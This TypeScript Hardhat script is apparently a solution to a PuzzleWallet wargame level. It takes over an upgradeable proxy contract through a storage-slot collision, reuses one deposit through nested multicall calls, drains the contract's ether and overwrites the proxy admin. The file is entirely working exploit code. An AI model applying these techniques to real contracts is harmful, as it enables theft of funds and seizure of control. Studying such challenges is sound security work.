import { ethers } from "hardhat";
import { PuzzleWallet__factory } from "../typechain/factories/contracts/PuzzleWallet.sol/PuzzleWallet__factory";
import { PuzzleProxy__factory } from "../typechain/factories/contracts/PuzzleWallet.sol/PuzzleProxy__factory";
import { utils } from "ethers";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0xe406A3d5052cb28B8F02411847AF3BaeB66B05E0";
    let puzzleProxy = new PuzzleProxy__factory(signer).attach(instance_address);
    let puzzleWallet = new PuzzleWallet__factory(signer).attach(instance_address);
    
    // console.log("pendingAdmin:", await provider.getStorageAt(instance_address, 0));
    // console.log("admin:",await provider.getStorageAt(instance_address, 1));
    // console.log("wallet address:", await provider.getStorageAt(instance_address, ethers.BigNumber.from("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")));
    // console.log("wallet slot0:", await provider.getStorageAt("0x2e9fc702fba745c25ac9ade0b25a82d9a763c24b", 0));
    // console.log("wallet slot1:", await provider.getStorageAt("0x2e9fc702fba745c25ac9ade0b25a82d9a763c24b", 1));
    // console.log("owner:", await puzzleWallet.owner());
    // console.log("maxBalance address:",(await puzzleWallet.maxBalance())._hex);
    // console.log("wallet balance:", await provider.getBalance("0x2e9fc702fba745c25ac9ade0b25a82d9a763c24b"));
    // console.log("proxy balance:", utils.formatEther(await provider.getBalance(instance_address)));
    
    
    let tx = await puzzleProxy.proposeNewAdmin(signer.address);
    await tx.wait();
    console.log(await puzzleWallet.owner());

    tx = await puzzleWallet.addToWhitelist(signer.address);
    await tx.wait();
    console.log(await puzzleWallet.whitelisted(signer.address));

    let coder = new utils.AbiCoder();
    let multicall_sig = utils.id("multicall(bytes[])").substring(0, 10);
    let deposit_sig = utils.id("deposit()").substring(0, 10);
    let param2_bytes = coder.encode(["bytes[]"], [[deposit_sig]]).substring(2);
    tx =  await puzzleWallet.multicall([deposit_sig, multicall_sig+param2_bytes], {value: utils.parseEther("0.001")});
    await tx.wait();
    /*
    let calldata = "";
    let param1_bytes = coder.encode(["bytes[]"], [[deposit_sig, multicall_sig+param2_bytes]]).substring(2);
    calldata = multicall_sig + param1_bytes;
    //console.log(calldata == tx.data);
    tx = await signer.sendTransaction({
        to: instance_address,
        value: utils.parseEther("0.001"),
        data: calldata,
    })
    await tx.wait();
    */
    console.log(utils.formatEther(await puzzleWallet.balances(signer.address)));
    console.log(utils.formatEther(await provider.getBalance(instance_address)));

    tx = await puzzleWallet.execute(signer.address, utils.parseEther("0.002"), "0x", {gasLimit:80000});
    await tx.wait();
    console.log(utils.formatEther(await provider.getBalance(instance_address)));

    tx = await puzzleWallet.setMaxBalance(signer.address);
    await tx.wait();
    console.log(await puzzleProxy.admin());
}   

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
